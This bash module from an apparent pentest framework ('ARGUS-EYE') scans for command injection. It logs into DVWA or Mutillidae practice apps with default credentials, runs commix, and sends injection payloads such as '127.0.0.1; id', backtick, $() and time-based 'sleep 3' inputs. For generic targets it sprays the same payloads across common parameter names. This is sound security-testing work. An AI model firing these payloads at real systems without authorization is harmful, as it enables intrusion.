#!/bin/bash
# ================================================
# ARGUS-EYE - Command Injection Scanner Module
# Tools: commix, custom_tests
# ================================================

SCANNER_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CORE_DIR="$(cd "$SCANNER_DIR/../core" && pwd)"
SCRIPT_DIR="$(cd "$SCANNER_DIR/../.." && pwd)"
TEMP_DIR="/tmp/argus_cmd_$$"
mkdir -p "$TEMP_DIR"

source "$CORE_DIR/utils.sh"
source "$CORE_DIR/installer.sh"
source "$CORE_DIR/tool_selection.sh"

# ================================================
# GLOBALS
# ================================================
DVWA_BASE=""
# Always use the shared cookie jar — consistent with all other scanners
COOKIE_JAR="/tmp/dvwa_cookies"

# ================================================
# PROGRESS TRACKING
# ================================================
TOTAL_STEPS=0; CURRENT_STEP=0; PROGRESS_BAR_WIDTH=40
init_progress() {
    TOTAL_STEPS=$1; CURRENT_STEP=0
    >&2 echo ""
    >&2 echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    >&2 echo -e "${CYAN}║              COMMAND INJECTION SCAN PROGRESS                 ║${NC}"
    >&2 echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
    >&2 echo ""
}
update_progress() {
    CURRENT_STEP=$((CURRENT_STEP+1))
    local p=$((CURRENT_STEP*100/TOTAL_STEPS))
    local f=$((p*PROGRESS_BAR_WIDTH/100))
    local e=$((PROGRESS_BAR_WIDTH-f))
    >&2 printf "\r${YELLOW}[${NC}"
    for ((i=0;i<f;i++)); do >&2 printf "${GREEN}▓${NC}"; done
    for ((i=0;i<e;i++)); do >&2 printf "${WHITE}░${NC}"; done
    >&2 printf "${YELLOW}] ${p}%% ${CYAN}($CURRENT_STEP/$TOTAL_STEPS)${NC} $1"
}
complete_progress() {
    >&2 echo ""; >&2 echo ""
    >&2 echo -e "${GREEN}✓ Scan completed!${NC}"
}
show_step() {
    local s=$1 t=$2 tool=$3 st=$4
    case $st in
        "start")    >&2 echo -ne "\n ${CYAN}▶ Step $s/$t:${NC} Running $tool... " ;;
        "complete") >&2 echo -e "${GREEN}✓${NC}" ;;
        "fail")     >&2 echo -e "${RED}✗${NC}" ;;
    esac
}
spinner() {
    local pid=$1 delay=0.1 spinstr='|/-\'
    while kill -0 "$pid" 2>/dev/null; do
        local temp=${spinstr#?}
        >&2 printf " [%c] " "$spinstr"
        spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        >&2 printf "\b\b\b\b\b\b"
    done
    >&2 printf "      \b\b\b\b\b\b"
}

# ================================================
# DVWA AUTO-DETECT
# ================================================
detect_dvwa_base() {
    local target=$1
    DVWA_BASE=""
    local host_base
    host_base=$(echo "$target" | grep -oP 'https?://[^/]+')
    local candidates=("${host_base}/dvwa" "${host_base}/DVWA" "$target")
    for candidate in "${candidates[@]}"; do
        local page
        page=$(curl -s --max-time 5 "${candidate}/login.php" 2>/dev/null)
        if echo "$page" | grep -qi "damn vulnerable" && \
           echo "$page" | grep -qi "username\|password\|Login"; then
            DVWA_BASE="$candidate"
            >&2 echo -e "${GREEN}[✓] DVWA detected at: $DVWA_BASE${NC}"
            return 0
        fi
    done
    >&2 echo -e "${YELLOW}[*] DVWA not detected — treating as generic target${NC}"
    return 1
}

# ================================================
# DVWA AUTO-LOGIN — uses shared /tmp/dvwa_cookies
# ================================================
dvwa_autologin() {
    local base_url=$1

    # Reuse existing valid session
    if [[ -f "$COOKIE_JAR" ]]; then
        local test_check
        test_check=$(curl -s --max-time 3 -b "$COOKIE_JAR" "${base_url}/index.php" 2>/dev/null)
        if echo "$test_check" | grep -qi "Welcome\|Logout\|DVWA Security"; then
            >&2 echo -e "${GREEN}[✓] Existing session valid — reusing${NC}"
            local sid
            sid=$(grep -i "PHPSESSID" "$COOKIE_JAR" | awk '{print $NF}' | head -1)
            >&2 echo -e "${CYAN}[*] PHPSESSID: ${sid}${NC}"
            return 0
        fi
    fi

    rm -f "$COOKIE_JAR"
    >&2 echo -e "\n${CYAN}[*] Logging into DVWA at ${base_url}...${NC}"

    curl -s -c "$COOKIE_JAR" "${base_url}/login.php" -o /tmp/dvwa_lp_$$.html 2>/dev/null
    curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
        -X POST "${base_url}/login.php" \
        --data-urlencode "username=admin" \
        --data-urlencode "password=admin" \
        --data-urlencode "Login=Login" \
        -L -o /dev/null 2>/dev/null
    curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
        -X POST "${base_url}/security.php" \
        --data "security=low&seclev_submit=Submit" \
        -o /dev/null 2>/dev/null
    rm -f /tmp/dvwa_lp_$$.html

    local check
    check=$(curl -s -b "$COOKIE_JAR" "${base_url}/index.php" 2>/dev/null)
    if echo "$check" | grep -qi "Welcome\|Logout\|DVWA Security"; then
        local sid
        sid=$(grep -i "PHPSESSID" "$COOKIE_JAR" | awk '{print $NF}' | head -1)
        >&2 echo -e "${GREEN}[✓] Login successful (admin/admin) — PHPSESSID: ${sid}${NC}"
        return 0
    fi

    >&2 echo -e "${YELLOW}[*] admin/admin failed — trying admin/password${NC}"
    rm -f "$COOKIE_JAR"
    curl -s -c "$COOKIE_JAR" "${base_url}/login.php" -o /dev/null 2>/dev/null
    curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
        -X POST "${base_url}/login.php" \
        --data-urlencode "username=admin" \
        --data-urlencode "password=password" \
        --data-urlencode "Login=Login" \
        -L -o /dev/null 2>/dev/null
    curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
        -X POST "${base_url}/security.php" \
        --data "security=low&seclev_submit=Submit" \
        -o /dev/null 2>/dev/null

    check=$(curl -s -b "$COOKIE_JAR" "${base_url}/index.php" 2>/dev/null)
    if echo "$check" | grep -qi "Welcome\|Logout\|DVWA Security"; then
        >&2 echo -e "${GREEN}[✓] Login successful (admin/password)${NC}"
        return 0
    fi

    >&2 echo -e "${RED}[!] Login failed${NC}"
    return 1
}

# ================================================
# TOOL: commix
# ================================================
run_commix() {
    local target=$1 out=$2 findings_file=$3 step=$4 total=$5
    show_step "$step" "$total" "commix" "start"
    > "$out"

    if ! command -v commix &>/dev/null; then
        echo "commix not installed — skipped" >> "$out"
        show_step "$step" "$total" "commix" "fail"
        update_progress "commix skipped (not installed)"
        echo "0" > "$TEMP_DIR/commix_count.tmp"
        return 1
    fi

    local counter_file="$TEMP_DIR/commix_count_$$.tmp"
    echo "0" > "$counter_file"

    local phpsessid
    phpsessid=$(grep -i "PHPSESSID" "$COOKIE_JAR" | awk '{print $NF}' | head -1)

    if [[ -n "$DVWA_BASE" ]]; then
        local test_url="${DVWA_BASE}/vulnerabilities/exec/"
        local cookie="PHPSESSID=${phpsessid}; security=low"

        >&2 echo -e "\n  ${CYAN}└─ commix: $test_url${NC}"
        >&2 echo -e "  ${CYAN}└─ Cookie: $cookie${NC}"

        # --web-root="/tmp/" pre-answers the "writable directory" prompt
        # that --batch alone doesn't suppress in v4.0
        # Remove < /dev/null — let --batch handle stdin prompts normally
        timeout 120 commix \
            -u "$test_url" \
            --data="ip=127.0.0.1&submit=submit" \
            --cookie="$cookie" \
            -p "ip" \
            --batch \
            --flush-session \
            --level=1 \
            --web-root="/tmp/" \
            > "$out" 2>&1
        >&2 echo ""

    else
        >&2 echo -e "\n  ${CYAN}└─ commix generic: $target${NC}"
        timeout 120 commix \
            -u "$target" \
            --batch \
            --flush-session \
            --level=1 \
            < /dev/null > "$out" 2>&1
    fi

    local pattern="appears to be injectable|is vulnerable to|Payload:|Type:.*injection|backdoor"
    if [[ -f "$out" ]]; then
        while IFS= read -r line; do
            local clean
            clean=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
            [[ -z "${clean// }" ]] && continue
            if echo "$clean" | grep -qiE "$pattern"; then
                {
                    echo "[HIGH] Command Injection Detected by commix"
                    echo "  Tool     : commix"
                    echo "  Target   : ${DVWA_BASE:-$target}"
                    echo "  Finding  : $clean"
                    echo "  Severity : HIGH"
                    echo ""
                } >> "$findings_file"
                echo $(( $(cat "$counter_file") + 1 )) > "$counter_file"
            fi
        done < "$out"
    fi

    local findings
    findings=$(cat "$counter_file")
    rm -f "$counter_file"
    show_step "$step" "$total" "commix" "complete"
    update_progress "commix completed ($findings findings)"
    echo "$findings" > "$TEMP_DIR/commix_count.tmp"
    return 0
}

# ================================================
# TOOL: custom_tests
# ================================================
run_custom_cmd_tests() {
    local target=$1 out=$2 findings_file=$3 step=$4 total=$5
    show_step "$step" "$total" "Custom Tests" "start"
    > "$out"

    local counter_file="$TEMP_DIR/custom_cmd_count_$$.tmp"
    echo "0" > "$counter_file"

    # ALWAYS do a fresh login for cmd scanner — sessions expire fast
    # and 40ms responses on sleep payloads = silent redirect to login.php
    if [[ -n "$DVWA_BASE" ]]; then
        >&2 echo -e "\n  ${CYAN}[*] Forcing fresh DVWA login before cmd tests...${NC}"
        dvwa_autologin "$DVWA_BASE"

        local phpsessid
        phpsessid=$(grep -i "PHPSESSID" "$COOKIE_JAR" | awk '{print $NF}' | head -1)
        >&2 echo -e "  ${CYAN}└─ PHPSESSID: ${phpsessid:-NOT FOUND}${NC}"

        # Verify exec page is actually accessible — not redirected to login
        local exec_probe
        exec_probe=$(curl -s --max-time 8 -b "$COOKIE_JAR" \
            "${DVWA_BASE}/vulnerabilities/exec/" 2>/dev/null)
        if echo "$exec_probe" | grep -qi "Enter an IP\|ping\|exec\|command"; then
            >&2 echo -e "  ${GREEN}[✓] Exec page accessible — auth confirmed${NC}"
        else
            >&2 echo -e "  ${RED}[!] Exec page NOT accessible — login may have failed${NC}"
            >&2 echo -e "  ${RED}    Responses will be 40ms redirects, not real results${NC}"
        fi
    fi

    {
        echo "=== CUSTOM COMMAND INJECTION TESTS ==="
        echo "Target : $target"
        if [[ -n "$DVWA_BASE" ]]; then
            echo "Type   : DVWA ($DVWA_BASE)"
        else
            echo "Type   : generic"
        fi
        echo "Date   : $(date)"
        echo ""

        if [[ -n "$DVWA_BASE" ]]; then
            local cmd_url="${DVWA_BASE}/vulnerabilities/exec/"
            >&2 echo -e "  ${CYAN}└─ Testing: $cmd_url${NC}"
            echo "--- DVWA Command Injection Tests ---"
            echo "URL   : $cmd_url"
            echo "Param : ip (POST)"
            echo ""

            # Single-quoted payloads — prevents bash expansion of backticks/$()
            local payloads=(
                '127.0.0.1; echo ARGUS_CMD_TEST'
                '127.0.0.1| echo ARGUS_CMD_TEST'
                '127.0.0.1 && echo ARGUS_CMD_TEST'
                '127.0.0.1 || echo ARGUS_CMD_TEST'
                '127.0.0.1 & echo ARGUS_CMD_TEST'
                '127.0.0.1; id'
                '127.0.0.1| id'
                '127.0.0.1 && id'
                '127.0.0.1`echo ARGUS_CMD_TEST`'
                '127.0.0.1$(echo ARGUS_CMD_TEST)'
                '127.0.0.1%0aecho ARGUS_CMD_TEST'
                '127.0.0.1%0aid'
                ';echo${IFS}ARGUS_CMD_TEST'
                '|echo${IFS}ARGUS_CMD_TEST'
            )
            local confirm_pattern="ARGUS_CMD_TEST|uid=[0-9]+|root:|www-data"
            local phpsessid
            phpsessid=$(grep -i "PHPSESSID" "$COOKIE_JAR" | awk '{print $NF}' | head -1)

            for payload in "${payloads[@]}"; do
                printf "  [%.45s]... " "$payload"
                local response
                # No -b jar (jar may have wrong security level stored)
                # No -L (follow-redirect converts POST→GET, payload lost)
                # Timeout 15s — ping -c 3 alone takes 3s, need headroom
                response=$(curl -s --max-time 15 \
                    -H "Cookie: PHPSESSID=${phpsessid}; security=low" \
                    -X POST \
                    --data-urlencode "ip=${payload}" \
                    --data-urlencode "submit=submit" \
                    "$cmd_url" 2>/dev/null)

                if echo "$response" | grep -qE "$confirm_pattern"; then
                    echo "VULNERABLE ✓"
                    local evidence=""
                    echo "$response" | grep -q "ARGUS_CMD_TEST" && evidence="marker echoed back"
                    echo "$response" | grep -qE "uid=[0-9]+" && \
                        evidence="RCE: $(echo "$response" | grep -oE 'uid=[0-9]+\([^)]+\)' | head -1)"
                    {
                        echo "[HIGH] Command Injection Confirmed"
                        echo "  Tool     : custom_tests"
                        echo "  Target   : $cmd_url"
                        echo "  Param    : ip (POST)"
                        echo "  Payload  : $payload"
                        echo "  Evidence : $evidence"
                        echo "  Severity : HIGH"
                        echo ""
                    } >> "$findings_file"
                    echo $(( $(cat "$counter_file") + 1 )) > "$counter_file"
                else
                    echo "not vulnerable"
                fi
            done

            # Time-based blind
            echo ""
            echo "  [Time-based blind injection]"
            local time_payloads=(
                '127.0.0.1; sleep 3'
                '127.0.0.1| sleep 3'
                '127.0.0.1 && sleep 3'
            )
            for payload in "${time_payloads[@]}"; do
                printf "  [BLIND %.35s]... " "$payload"
                local t_start t_end elapsed
                t_start=$(date +%s%N)
                curl -s --max-time 15 \
                    -H "Cookie: PHPSESSID=${phpsessid}; security=low" \
                    -X POST \
                    --data-urlencode "ip=${payload}" \
                    --data-urlencode "submit=submit" \
                    "$cmd_url" > /dev/null 2>&1
                t_end=$(date +%s%N)
                elapsed=$(( (t_end - t_start) / 1000000 ))
                if [[ $elapsed -ge 2800 ]]; then
                    echo "BLIND INJECTION ✓ (${elapsed}ms)"
                    {
                        echo "[HIGH] Blind Command Injection (time-based)"
                        echo "  Tool     : custom_tests"
                        echo "  Target   : $cmd_url"
                        echo "  Payload  : $payload"
                        echo "  Evidence : ${elapsed}ms delay (threshold 2800ms)"
                        echo "  Severity : HIGH"
                        echo ""
                    } >> "$findings_file"
                    echo $(( $(cat "$counter_file") + 1 )) > "$counter_file"
                else
                    echo "no delay (${elapsed}ms)"
                fi
            done

        elif [[ "$target" == *"mutillidae"* ]]; then
            local mutil_base
            mutil_base=$(echo "$target" | sed -E 's#(https?://[^/]+/[^/]+).*#\1#')
            >&2 echo -e "  ${CYAN}└─ Testing Mutillidae command injection${NC}"
            echo "--- Mutillidae Command Injection Tests ---"

            # Mutillidae has dns-lookup.php which is vulnerable to command injection
            local dns_url="${mutil_base}/index.php?page=dns-lookup.php"
            echo "URL: $dns_url"
            echo ""

            local payloads=(
                '127.0.0.1; echo ARGUS_CMD_TEST'
                '127.0.0.1| echo ARGUS_CMD_TEST'
                '127.0.0.1 && echo ARGUS_CMD_TEST'
                '127.0.0.1; id'
                '127.0.0.1| id'
            )
            local confirm_pattern="ARGUS_CMD_TEST|uid=[0-9]+|root:|www-data"

            for payload in "${payloads[@]}"; do
                printf "  dns hostname=[%.40s]... " "$payload"
                local response
                response=$(curl -s -L --max-time 8 \
                    -X POST \
                    --data-urlencode "target-lookup-hostname=${payload}" \
                    --data-urlencode "dns-lookup-php-submit-button=Lookup DNS" \
                    "$dns_url" 2>/dev/null)
                if echo "$response" | grep -qE "$confirm_pattern"; then
                    echo "VULNERABLE ✓"
                    local evidence=""
                    echo "$response" | grep -q "ARGUS_CMD_TEST" && evidence="marker echoed"
                    echo "$response" | grep -qE "uid=[0-9]+" && \
                        evidence="RCE: $(echo "$response" | grep -oE 'uid=[0-9]+\([^)]+\)' | head -1)"
                    {
                        echo "[HIGH] Command Injection Confirmed"
                        echo "  Tool     : custom_tests"
                        echo "  Target   : $dns_url (Mutillidae)"
                        echo "  Param    : target-lookup-hostname (POST)"
                        echo "  Payload  : $payload"
                        echo "  Evidence : $evidence"
                        echo "  Severity : HIGH"
                        echo ""
                    } >> "$findings_file"
                    echo $(( $(cat "$counter_file") + 1 )) > "$counter_file"
                else
                    echo "not vulnerable"
                fi
            done

        else
            >&2 echo -e "  ${CYAN}└─ Generic target: $target${NC}"
            echo "--- Generic Command Injection Tests ---"
            echo ""

            local base_url
            base_url=$(echo "$target" | cut -d'?' -f1)
            local params=("cmd" "command" "exec" "ping" "ip" "host" "url" "file" "query" "q" "input")
            local gen_payloads=(
                '127.0.0.1; echo ARGUS_CMD_TEST'
                '127.0.0.1| echo ARGUS_CMD_TEST'
                '127.0.0.1 && echo ARGUS_CMD_TEST'
                '127.0.0.1; id'
                '127.0.0.1| id'
                '; echo ARGUS_CMD_TEST'
                '| id'
            )
            local gen_confirm="ARGUS_CMD_TEST|uid=[0-9]+|root:|www-data"

            for param in "${params[@]}"; do
                for payload in "${gen_payloads[@]}"; do
                    printf "  GET ?%s=[payload]... " "$param"
                    local response
                    response=$(curl -s -L --max-time 8 \
                        -G --data-urlencode "${param}=${payload}" \
                        "$base_url" 2>/dev/null)
                    if echo "$response" | grep -qE "$gen_confirm"; then
                        echo "VULNERABLE ✓"
                        {
                            echo "[HIGH] Command Injection Confirmed"
                            echo "  Tool     : custom_tests"
                            echo "  URL      : ${base_url}?${param}=..."
                            echo "  Param    : $param"
                            echo "  Payload  : $payload"
                            echo "  Severity : HIGH"
                            echo ""
                        } >> "$findings_file"
                        echo $(( $(cat "$counter_file") + 1 )) > "$counter_file"
                    else
                        echo "not vulnerable"
                    fi
                done
            done
        fi

        local final_count
        final_count=$(cat "$counter_file")
        echo ""
        echo "Custom tests completed with $final_count findings"

    } > "$out" 2>&1

    local custom_findings
    custom_findings=$(cat "$counter_file")
    rm -f "$counter_file"

    show_step "$step" "$total" "Custom Tests" "complete"
    update_progress "Custom tests completed ($custom_findings findings)"
    echo "$custom_findings" > "$TEMP_DIR/custom_cmd_count.tmp"
}

# ================================================
# MAIN SCAN FUNCTION
# ================================================
scan_cmd() {
    local target=$1 output_dir=$2 selected_tools=$3
    mkdir -p "$output_dir"/{raw_output,findings}
    local findings_file="$output_dir/findings/cmd_findings.txt"
    local summary_file="$output_dir/raw_output/cmd_summary.txt"

    detect_dvwa_base "$target"
    [[ -n "$DVWA_BASE" ]] && dvwa_autologin "$DVWA_BASE"

    {
        echo "========================================"
        echo "COMMAND INJECTION SCAN RESULTS"
        echo "========================================"
        echo "Target     : $target"
        echo "DVWA Base  : ${DVWA_BASE:-N/A}"
        echo "Date       : $(date)"
        echo "Tools used : $selected_tools"
        echo "========================================"
        echo ""
    } > "$findings_file"

    >&2 echo -e "${CYAN}\n┌─────────────────────────────────────────────────────────────────────┐"
    >&2 echo -e "│              COMMAND INJECTION VULNERABILITY SCANNER                │"
    >&2 echo -e "└─────────────────────────────────────────────────────────────────────┘${NC}"
    >&2 echo -e "${YELLOW}[*] Target    : $target${NC}"
    >&2 echo -e "${YELLOW}[*] DVWA Base : ${DVWA_BASE:-not detected}${NC}"
    >&2 echo -e "${YELLOW}[*] Tools     : $selected_tools${NC}\n"

    IFS=' ' read -ra TOOL_ARRAY <<< "$selected_tools"
    local total_tools=${#TOOL_ARRAY[@]}
    init_progress $total_tools
    local total_findings=0 tools_run=0 tools_success=0

    for tool in "${TOOL_ARRAY[@]}"; do
        tools_run=$((tools_run+1))
        local tool_output="$output_dir/raw_output/${tool}_cmd.txt"
        local tool_findings=0

        case $tool in
            "commix")
                if run_commix "$target" "$tool_output" "$findings_file" \
                        "$tools_run" "$total_tools"; then
                    tools_success=$((tools_success+1))
                fi
                if [[ -f "$TEMP_DIR/commix_count.tmp" ]]; then
                    tool_findings=$(cat "$TEMP_DIR/commix_count.tmp")
                    rm -f "$TEMP_DIR/commix_count.tmp"
                fi
                ;;
            "custom_tests")
                run_custom_cmd_tests "$target" "$tool_output" "$findings_file" \
                    "$tools_run" "$total_tools"
                tools_success=$((tools_success+1))
                if [[ -f "$TEMP_DIR/custom_cmd_count.tmp" ]]; then
                    tool_findings=$(cat "$TEMP_DIR/custom_cmd_count.tmp")
                    rm -f "$TEMP_DIR/custom_cmd_count.tmp"
                fi
                ;;
            *)
                >&2 echo -e "${YELLOW}[!] Unknown tool: $tool${NC}"
                ;;
        esac

        [[ "$tool_findings" =~ ^[0-9]+$ ]] || tool_findings=0
        total_findings=$((total_findings + tool_findings))
        echo "$tool findings: $tool_findings" >> "$findings_file"
        >&2 echo ""
    done

    {
        echo ""
        echo "========================================"
        echo "SCAN SUMMARY"
        echo "========================================"
        echo "Tools run       : $tools_run"
        echo "Tools successful: $tools_success"
        echo "Total findings  : $total_findings"
        echo "========================================"
    } >> "$findings_file"

    rm -rf "$TEMP_DIR"
    echo "$total_findings" > "$summary_file"
    complete_progress
    >&2 echo -e "${GREEN}[✓] Command injection scan completed${NC}"
    >&2 echo -e "${YELLOW}[*] Tools run: $tools_run/$total_tools${NC}"
    >&2 echo -e "${RED}[*] Total findings: $total_findings${NC}\n"
    echo "$total_findings"
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    [[ $# -lt 3 ]] && {
        >&2 echo -e "${RED}[!] Usage: $0 <target_url> <output_dir> <selected_tools>${NC}"
        exit 1
    }
    findings=$(scan_cmd "$1" "$2" "$3")
    echo "FINDINGS_COUNT=$findings"
    exit 0
fi
